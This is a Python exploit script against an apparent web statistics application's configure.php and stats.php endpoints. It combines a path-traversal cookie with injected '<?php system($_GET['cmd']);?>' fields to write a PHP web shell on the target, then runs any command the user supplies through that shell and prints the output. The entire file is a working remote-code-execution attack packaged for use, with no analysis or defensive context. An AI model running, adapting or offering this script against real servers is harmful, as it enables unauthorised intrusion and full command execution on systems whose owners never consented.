#!/usr/bin/python3
import hashlib
import sys
import random
from urllib.parse import urlencode
import urllib.parse as urlparse
import requests


def exploit(target, payload):
    print("Exploiting target: {}".format(target))

    cluster_name = "%s%d" % ("test", random.randint(1000, 9999))
    cluster_hash = hashlib.md5(cluster_name.encode()).hexdigest()
    shell_file_name = cluster_name + ".php"

    cookie_name = "live_stats_id" + cluster_hash
    cookie_value = "/../../{}".format(shell_file_name)

    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
    }

    data = {
        "cluster[1]": cluster_name,
        "server[1][1][name]": "<?php system($_GET['cmd']);?>",
        "server[1][1][hostname]": "<?php system($_GET['cmd']);?>:123:1",
        "server[1][1][port]": 123,
    }

    cookies = {
        cookie_name: cookie_value,
    }

    print("Add cluster with name {} and md5 hash {}".format(cluster_name, cluster_hash))
    conf_url = urlparse.urljoin(target, "/configure.php?request_write=servers")
    r = requests.post(conf_url, headers=headers, data=data, cookies=cookies, verify=False)
    if r.status_code != 200:
        print("[-] Adding cluster failed! Target might not vulnerable")
        exit(1)

    print("Drop shell file {}".format(shell_file_name))
    stats_url = urlparse.urljoin(target, "/stats.php?&cluster=")
    r = requests.post(stats_url, headers=headers, data=data, cookies=cookies, verify=False)
    if r.status_code != 200:
        print("[-] Dropping file through stats failed! Target might not vulnerable")
        exit(1)

    shell_url = urlparse.urljoin(target, shell_file_name)
    print("[+] Shell URL: {}".format(shell_url))

    params = {"cmd": payload}
    url_parts = list(urlparse.urlparse(shell_url))
    query = dict(urlparse.parse_qsl(url_parts[4]))
    query.update(params)

    url_parts[4] = urlencode(query)

    full_payload_url = urlparse.urlunparse(url_parts)
    r = requests.get(full_payload_url)
    if r.status_code != 200:
        print("[-] Shell not reachable. Upload probably failed! A retry might help. Target might not vulnerable")
        exit(1)

    print("[+] Full Shell Payload URL: {}".format(full_payload_url))
    print("[+] Output: {}".format(str(r.content)))


def main():
    if len(sys.argv) != 3:
        print("Usage: exploit.py <target> <payload>")
        print("Example: exploit.py https://target:8443 id")
        print("Example: exploit.py https://target:8443 'ls -la'")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2])


if __name__ == "__main__":
    main()
